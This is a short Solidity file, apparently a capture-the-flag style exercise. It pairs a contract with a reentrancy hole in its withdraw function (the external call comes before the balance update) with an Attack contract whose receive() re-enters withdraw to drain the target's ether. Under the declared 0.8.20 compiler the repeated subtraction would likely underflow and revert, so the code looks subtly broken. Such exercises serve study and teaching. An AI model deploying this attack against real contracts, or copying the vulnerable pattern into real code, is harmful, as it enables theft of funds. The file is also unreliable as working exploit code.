// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Reentrance {
    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] += msg.value;
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract Attack {
    Reentrance public reentrance;

    constructor(Reentrance _reentrance) {
        reentrance = _reentrance;
    }

    function attack() external payable {
        // Donate ETH to this contract's balance in Reentrance
        reentrance.donate{value: msg.value}(address(this));

        // Start the withdrawal to trigger reentrancy
        reentrance.withdraw(msg.value);
    }

    receive() external payable {
        uint256 bal = reentrance.balanceOf(address(this));
        if (address(reentrance).balance > 0 && bal > 0) {
            uint256 toWithdraw = bal < 1 ether ? bal : 1 ether;
            reentrance.withdraw(toWithdraw);
        }
    }
}
